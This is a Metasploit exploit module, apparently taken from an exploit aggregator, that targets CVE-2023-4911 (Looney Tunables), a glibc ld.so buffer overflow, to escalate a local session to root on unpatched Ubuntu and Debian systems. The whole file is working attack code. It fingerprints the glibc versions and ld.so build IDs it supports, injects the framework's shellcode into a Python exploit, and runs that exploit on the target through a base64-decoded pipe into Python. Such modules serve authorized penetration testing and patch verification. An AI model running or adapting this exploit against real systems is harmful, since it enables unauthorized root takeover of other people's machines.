## https://sploitus.com/exploit?id=PACKETSTORM:176288
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
Rank = ExcellentRanking

# includes: is_root?
include Msf::Post::Linux::Priv
# includes: kernel_release
include Msf::Post::Linux::Kernel
# include: get_sysinfo
include Msf::Post::Linux::System
# includes writable?, upload_file, upload_and_chmodx, exploit_data, cd
include Msf::Post::File
# includes register_files_for_cleanup
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck

BUILD_IDS = {
'69c048078b6c51fa8744f3d7cff3b0d9369ffd53' => 561,
'3602eac894717d56555552c84fc6b0e4d6a4af72' => 561,
'a99db3715218b641780b04323e4ae5953d68a927' => 561,
'a8daca28288575ffc8c7641d40901b0148958fb1' => 580,
'61ef896a699bb1c2e4e231642b2e1688b2f1a61e' => 560,
'9a9c6aeba5df4178de168e26fe30ddcdab47d374' => 580,
'e7b1e0ff3d359623538f4ae0ac69b3e8db26b674' => 580,
'956d98a11b839e3392fa1b367b1e3fdfc3e662f6' => 322
}
def initialize(info = {})
super(
update_info(
info,
'Name' => 'Glibc Tunables Privilege Escalation CVE-2023-4911 (aka Looney Tunables)',
'Description' => %q{
A buffer overflow exists in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES
environment variable. This issue allows an local attacker to use maliciously crafted GLIBC_TUNABLES when
launching binaries with SUID permission to execute code in the context of the root user.

This module targets glibc packaged on Ubuntu and Debian. The specific glibc versions this module targets are:

Ubuntu:
2.35-0ubuntu3.4 > 2.35
2.37-0ubuntu2.1 > 2.37
2.38-1ubuntu6 > 2.38

Debian:
2.31-13-deb11u7 > 2.31
2.36-9-deb12u3 > 2.36

Fedora 37 and 38 and other distributions of linux also come packaged with versions of glibc vulnerable to CVE-2023-4911
however this module does not target them.
},
'Author' => [
'Qualys Threat Research Unit', # discovery
'blasty <peter@haxx.in>', # PoC
'jheysel-r7' # msf module
],
'References' => [
['CVE', '2023-4911'],
['URL', 'https://haxx.in/files/gnu-acme.py'],
['URL', 'https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt'],
['URL', 'https://security-tracker.debian.org/tracker/CVE-2023-4911'],
['URL', 'https://ubuntu.com/security/CVE-2023-4911']
],
'License' => MSF_LICENSE,
'Platform' => [ 'linux', 'unix' ],
'Arch' => [ ARCH_X86, ARCH_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'DefaultTarget' => 0,
'DefaultOptions' => {
'PrependSetresgid' => true,
'PrependSetresuid' => true,
'WfsDelay' => 600
},
'DisclosureDate' => '2023-10-03',
'Notes' => {
'Stability' => [ CRASH_SAFE, ],
'SideEffects' => [ ],
'Reliability' => [ REPEATABLE_SESSION, ]
}
)
)
register_advanced_options([
OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ])
])
end

def find_exec_program
%w[python python3].select(&method(:command_exists?)).first
rescue StandardError => e
fail_with(Failure::Unknown, "An error occurred finding a version of python to use: #{e.message}")
end

def check
glibc_version = cmd_exec('ldd --version')&.scan(/ldd\s+\(\w+\s+GLIBC\s+(\S+)\)/)&.flatten&.first
return CheckCode::Unknown('Could not get the version of glibc') unless glibc_version

sysinfo = get_sysinfo
case sysinfo[:distro]
when 'ubuntu'
# Ubuntu's version looks like: 2.35-0ubuntu3.4. The following massaging is necessary for Rex::Version compatibility
test_version = glibc_version.gsub(/-\d+ubuntu/, '.')
if Rex::Version.new(test_version).between?(Rex::Version.new('2.35'), Rex::Version.new('2.35.3.4')) ||
Rex::Version.new(test_version).between?(Rex::Version.new('2.37'), Rex::Version.new('2.37.2.1')) ||
Rex::Version.new(test_version).between?(Rex::Version.new('2.38'), Rex::Version.new('2.38.6'))
return CheckCode::Appears("The glibc version (#{glibc_version}) found on the target appears to be vulnerable")
end
when 'debian'
# Debian's version looks like: 2.36-9+deb12u1. The following massaging is necessary for Rex::Version compatibility
test_version = glibc_version.gsub(/\+deb/, '.').gsub(/u/, '.').gsub('-', '.')
if Rex::Version.new(test_version).between?(Rex::Version.new('2.31'), Rex::Version.new('2.31.13.11.7')) ||
Rex::Version.new(test_version).between?(Rex::Version.new('2.36'), Rex::Version.new('2.36.9.12.3'))
return CheckCode::Appears("The glibc version (#{glibc_version}) found on the target appears to be vulnerable")
end
else
return CheckCode::Unknown('The module has not been tested against this Linux distribution')
end
CheckCode::Safe("The glibc version (#{glibc_version}) found on the target does not appear to be vulnerable")
end

def check_ld_so_build_id
# Check to ensure the python exploit has the magic offset defined for the BuildID for ld.so
if !command_exists?('file')
print_warning('Unable to locate the `file` command ti order to verify the BuildID for ld.so, the exploit has a chance of being incompatible with this target.')
return
end
file_cmd_output = ''

# This needs to be split up by distro as Ubuntu has readlink and which installed by default but "ld.so" is not
# defined on the path like it is on Debian. Also Ubuntu doesn't have ldconfig install by default.
sysinfo = get_sysinfo
case sysinfo[:distro]
when 'ubuntu'
if command_exists?('ldconfig')
file_cmd_output = cmd_exec('file $(ldconfig -p | grep -oE "/.*ld-linux.*so\.[0-9]*")')
end
when 'debian'
file_cmd_output = cmd_exec('file "$(readlink -f "$(command -v ld.so)")"')
else
fail_with(Failure::NoTarget, 'The module has not been tested against this Linux distribution')
end

if file_cmd_output =~ /BuildID\[.+\]=(\w+),/
build_id = Regexp.last_match(1)
if BUILD_IDS.keys.include?(build_id)
print_good("The Build ID for ld.so: #{build_id} is in the list of supported Build IDs for the exploit.")
else
fail_with(Failure::NoTarget, "The Build ID for ld.so: #{build_id} is not in the list of supported Build IDs for the exploit.")
end
else
print_warning('Unable to verify the BuildID for ld.so, the exploit has a chance of being incompatible with this target.')
end
end

def exploit
fail_with(Failure::BadConfig, 'Session already has root privileges') if is_root?

python_binary = find_exec_program
fail_with(Failure::NotFound, 'The python binary was not found.') unless python_binary
vprint_status("Using '#{python_binary}' to run the exploit")

check_ld_so_build_id

# The python script assumes the working directory is the one we can write to.
cd(datastore['WritableDir'])
shell_code = payload.encoded.unpack('H*').first

exploit_data = exploit_data('CVE-2023-4911', 'cve_2023_4911.py')
exploit_data = exploit_data.gsub('METASPLOIT_SHELL_CODE', shell_code)
exploit_data = exploit_data.gsub('METASPLOIT_BUILD_IDS', BUILD_IDS.to_s.gsub('=>', ':'))

# If there is no response from cmd_exec after the brief 15s timeout, this indicates exploit is running successfully
output = cmd_exec("echo #{Rex::Text.encode_base64(exploit_data)} |base64 -d | #{python_binary}")
if output.blank?
print_good('The exploit is running. Please be patient. Receiving a session could take up to 10 minutes.')
else
print_line(output)
end
end
end
